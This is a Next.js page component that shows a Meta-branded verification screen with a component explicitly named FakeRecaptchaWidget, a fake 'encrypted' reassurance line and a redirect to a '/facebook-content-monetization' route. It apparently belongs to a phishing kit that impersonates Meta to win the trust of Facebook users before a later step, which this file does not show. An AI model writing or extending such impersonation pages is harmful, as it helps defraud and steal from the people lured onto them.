'use client'

import React from 'react'
import { useRouter } from 'next/navigation'

import FakeRecaptchaWidget from '@/components/recaptcha/FakeRecaptchaWidget'
import { useAppStrings } from '@/hooks/useAppStrings'

const ReCaptchaPage = () => {
    const t = useAppStrings()
    const [step, setStep] = React.useState<'gate' | 'challenge'>('gate')
    const [widgetKey, setWidgetKey] = React.useState(0)
    const router = useRouter()
    const navigateTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null)

    React.useEffect(() => {
        return () => {
            if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
        }
    }, [])

    const openChallenge = React.useCallback(() => {
        setWidgetKey((k) => k + 1)
        setStep('challenge')
    }, [])

    const handleVerified = React.useCallback(() => {
        if (navigateTimerRef.current) clearTimeout(navigateTimerRef.current)
        navigateTimerRef.current = setTimeout(() => {
            navigateTimerRef.current = null
            router.push('/facebook-content-monetization')
        }, 550)
    }, [router])

    return (
        <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
            <div className="font-roboto text-[14px] text-gray-800 w-full max-w-[325px] flex flex-col justify-start px-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pb-[max(1.5rem,env(safe-area-inset-bottom))] pt-[max(1.5rem,env(safe-area-inset-top))] sm:h-screen sm:justify-center sm:py-0 md:px-0">
                <div className="w-full">
                    <img src="/images/meta/logo-meta.svg" alt="" className="w-[64px]" />
                </div>

                {step === 'gate' ? (
                    <div className="mt-6 w-full">
                        <h1 className="font-helvetica text-[17px] font-bold leading-snug text-[#0A1317]">
                            {t.captcha.verifyHeading}
                        </h1>
                        <p className="mt-3 font-helvetica text-[13px] leading-relaxed text-[#5c6570]">
                            {t.captcha.openVerifyStepLead}
                        </p>
                        <button
                            type="button"
                            className="mt-6 flex min-h-[48px] w-full items-center justify-center rounded-full bg-[#0064e0] px-6 text-[15px] font-bold text-white shadow-[0_6px_16px_rgba(0,100,224,0.2)] transition hover:brightness-105 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-[#0064e0] active:brightness-95"
                            onClick={openChallenge}
                        >
                            {t.info.submit}
                        </button>
                        <p className="mt-4 text-center text-[11px] leading-snug text-[#65676B] sm:text-[12px]">{t.info.encryptedHint}</p>
                    </div>
                ) : (
                    <>
                        <p className="mt-5 font-helvetica text-[13px] leading-relaxed text-[#5c6570]">
                            {t.captcha.verifyHint}
                        </p>
                        <FakeRecaptchaWidget
                            key={widgetKey}
                            idPrefix="fbcm-slug"
                            texts={{
                                notRobot: t.captcha.notRobot,
                                privacyTerms: t.captcha.privacyTerms,
                                a11yVerifying: t.captcha.a11yVerifying,
                                a11yVerified: t.captcha.a11yVerified,
                            }}
                            onVerified={handleVerified}
                        />
                        <button
                            type="button"
                            className="mt-4 text-[13px] font-semibold text-[#0064e0] underline-offset-2 hover:underline"
                            onClick={() => setStep('gate')}
                        >
                            {t.captcha.cancelChallenge}
                        </button>

                        <details className="mt-6 rounded-lg border border-[#e8eaed] bg-[#fafbfc] px-3 py-2 font-helvetica">
                            <summary className="cursor-pointer select-none py-1 text-[13px] font-semibold text-[#3b4a64]">
                                {t.captcha.legalDetailsLabel}
                            </summary>
                            <div className="mt-2 space-y-4 border-t border-[#eef0f3] pt-3 text-[13px] leading-[1.3] text-gray-700">
                                <p className="font-normal">{t.captcha.p1}</p>
                                <p className="font-normal">{t.captcha.p2}</p>
                                <p className="font-normal">{t.captcha.p3}</p>
                            </div>
                        </details>
                    </>
                )}
            </div>
        </div>
    )
}

export default ReCaptchaPage
